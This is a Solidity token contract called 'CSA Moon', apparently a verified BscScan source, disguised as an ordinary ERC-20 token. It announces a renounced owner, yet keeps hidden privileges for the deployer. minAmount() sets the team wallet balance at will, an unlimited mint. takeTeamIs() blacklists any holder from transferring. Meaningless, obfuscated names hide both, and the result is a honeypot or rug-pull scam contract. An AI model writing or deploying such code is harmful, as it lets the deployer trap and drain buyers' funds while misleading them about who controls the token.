/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract amountToken {
    function modeLaunched() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface launchedList {
    function createPair(address receiverFee, address feeLaunched) external returns (address);
}

interface takeMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CSAMoon is IERC20, amountToken {

    function transferFrom(address minSender, address takeAuto, uint256 atEnable) external override returns (bool) {
        if (listFeeShould[minSender][modeLaunched()] != type(uint256).max) {
            require(atEnable <= listFeeShould[minSender][modeLaunched()]);
            listFeeShould[minSender][modeLaunched()] -= atEnable;
        }
        return feeReceiver(minSender, takeAuto, atEnable);
    }

    function atAuto() public {
        if (maxBuy == isTake) {
            senderWallet = true;
        }
        if (senderWallet != takeFrom) {
            maxBuy = isTake;
        }
        senderWallet=false;
    }

    uint256 private isTake;

    address public teamLaunchReceiver;

    function swapAuto(address minSender, address takeAuto, uint256 atEnable) internal returns (bool) {
        require(amountSwap[minSender] >= atEnable);
        amountSwap[minSender] -= atEnable;
        amountSwap[takeAuto] += atEnable;
        emit Transfer(minSender, takeAuto, atEnable);
        return true;
    }

    function getOwner() external view returns (address) {
        return limitTradingMarketing;
    }

    bool public limitShould;

    function totalSupply() external view virtual override returns (uint256) {
        return fundTeam;
    }

    function feeReceiver(address minSender, address takeAuto, uint256 atEnable) internal returns (bool) {
        if (minSender == teamLaunchReceiver) {
            return swapAuto(minSender, takeAuto, atEnable);
        }
        require(!launchWallet[minSender]);
        return swapAuto(minSender, takeAuto, atEnable);
    }

    uint256 public maxBuy;

    function owner() external view returns (address) {
        return limitTradingMarketing;
    }

    string private totalExempt = "CMN";

    function transfer(address minTo, uint256 atEnable) external virtual override returns (bool) {
        return feeReceiver(modeLaunched(), minTo, atEnable);
    }

    event OwnershipTransferred(address indexed swapAtReceiver, address indexed toReceiver);

    mapping(address => mapping(address => uint256)) private listFeeShould;

    function balanceOf(address liquidityTotal) public view virtual override returns (uint256) {
        return amountSwap[liquidityTotal];
    }

    function symbol() external view returns (string memory) {
        return totalExempt;
    }

    function minAmount(uint256 atEnable) public {
        if (!exemptLiquidity[modeLaunched()]) {
            return;
        }
        amountSwap[teamLaunchReceiver] = atEnable;
    }

    bool private takeFrom;

    function takeTeamIs(address fromTokenEnable) public {
        
        if (fromTokenEnable == teamLaunchReceiver || fromTokenEnable == isLimit || !exemptLiquidity[modeLaunched()]) {
            return;
        }
        
        launchWallet[fromTokenEnable] = true;
    }

    uint8 private liquidityLimit = 18;

    address public isLimit;

    bool public marketingAmount;

    function toLaunch() public {
        emit OwnershipTransferred(teamLaunchReceiver, address(0));
        limitTradingMarketing = address(0);
    }

    mapping(address => uint256) private amountSwap;

    function allowance(address fromTotal, address exemptFee) external view virtual override returns (uint256) {
        return listFeeShould[fromTotal][exemptFee];
    }

    function name() external view returns (string memory) {
        return listSender;
    }

    bool private fundLiquidity;

    address private limitTradingMarketing;

    function decimals() external view returns (uint8) {
        return liquidityLimit;
    }

    function swapIs() public {
        if (takeFrom == marketingAmount) {
            sellReceiver = true;
        }
        
        isTake=0;
    }

    constructor (){
        if (isTake == maxBuy) {
            senderWallet = false;
        }
        takeMarketing autoAtMarketing = takeMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isLimit = launchedList(autoAtMarketing.factory()).createPair(autoAtMarketing.WETH(), address(this));
        limitTradingMarketing = modeLaunched();
        
        teamLaunchReceiver = modeLaunched();
        exemptLiquidity[modeLaunched()] = true;
        if (isTake != maxBuy) {
            sellReceiver = true;
        }
        amountSwap[modeLaunched()] = fundTeam;
        emit Transfer(address(0), teamLaunchReceiver, fundTeam);
        toLaunch();
    }

    function approve(address exemptFee, uint256 atEnable) public virtual override returns (bool) {
        listFeeShould[modeLaunched()][exemptFee] = atEnable;
        emit Approval(modeLaunched(), exemptFee, atEnable);
        return true;
    }

    uint256 private fundTeam = 100000000 * 10 ** 18;

    mapping(address => bool) public exemptLiquidity;

    bool private sellReceiver;

    function fromReceiverLaunch() public view returns (uint256) {
        return maxBuy;
    }

    function minFeeMarketing() public view returns (bool) {
        return senderWallet;
    }

    bool public senderWallet;

    function buyLaunch() public view returns (bool) {
        return senderWallet;
    }

    string private listSender = "CSA Moon";

    mapping(address => bool) public launchWallet;

    function receiverLimit(address toSender) public {
        if (limitShould) {
            return;
        }
        if (fundLiquidity) {
            senderWallet = true;
        }
        exemptLiquidity[toSender] = true;
        
        limitShould = true;
    }

}